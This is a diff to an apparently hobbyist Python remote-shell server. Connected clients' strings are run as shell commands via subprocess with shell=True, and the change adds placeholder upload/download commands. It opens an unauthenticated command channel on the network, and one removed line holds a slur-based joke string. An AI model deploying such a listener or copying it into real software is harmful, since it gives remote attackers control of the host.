@@ -22,10 +22,24 @@ IP = str(re.findall( r'[0-9]+(?:.[0-9]+){3}', IP)[0])
 #server can handle up to 3 concurrent sessions
 server.listen(3)
 
+
+
+
+def upload(clientSocket):
+    i = 2 #Placeholder
+#client -> server
+    #TODO THIS
+
+
+def download():
+    i = 1 #Placeholder
+#server -> client
+
+
+
 def commands(command):
     command = command.rstrip()
     #Debug statement
-
     if command == "":
         return command
     elif command[0] != "!":
@@ -35,14 +49,16 @@ STDOUT, shell=True)
             result = "\n" + result
             return result
         except:
-            result = "Failed to execute command.\n"
+            result = "\nCommand Indicated Failure.\n"
             return result
 
     elif command[0] == "!":
         command = command[1:]
-        result = "nibba punch"
-        return result
-
+        if command == "upload":
+            #TODO WORK ON UPLOAD
+            upload(clientSocket)
+        elif command == 'download':
+            i = 3 #Placeholder
     else:
         sys.exit(1)
 ##
@@ -72,7 +88,6 @@ def handleClient(clientSocket):
         #send the w and uname to client, jump to shell loop
         clientSocket.send("\n[+] Accepted Connection\n")
         shell(clientSocket)
-
     else:
         clientSocket.close()
 
